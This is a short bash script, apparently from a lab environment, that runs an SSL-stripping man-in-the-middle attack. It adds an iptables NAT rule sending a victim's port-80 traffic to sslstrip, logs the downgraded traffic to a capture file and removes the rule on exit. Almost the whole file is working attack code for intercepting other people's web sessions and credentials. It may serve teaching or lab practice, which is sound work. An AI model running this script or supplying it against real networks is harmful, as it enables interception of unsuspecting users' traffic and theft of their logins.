#!/usr/bin/env bash
# Redirect victim HTTP(S) through sslstrip. Only effective on non-HSTS sites.
set -euo pipefail
source "$(dirname "$0")/lab.env"

if [[ $EUID -ne 0 ]]; then
  exec sudo -E "$0" "$@"
fi

PORT=10000
LOG="$CAPTURE_DIR/sslstrip-$(date +%Y%m%d-%H%M%S).log"
mkdir -p "$CAPTURE_DIR"

cleanup() {
  echo "[*] Removing PREROUTING redirect..."
  iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$PORT" 2>/dev/null || true
  pkill -f "sslstrip -a -l $PORT" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

echo "[*] Adding iptables redirect 80 -> $PORT ..."
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$PORT"

echo "[*] Starting sslstrip. Log: $LOG"
echo "[i] Try HTTP-only sites from the victim to see stripped output."
echo "[i] HSTS-enforced sites will refuse to downgrade; that is expected."
echo

sslstrip -a -l "$PORT" -w "$LOG"
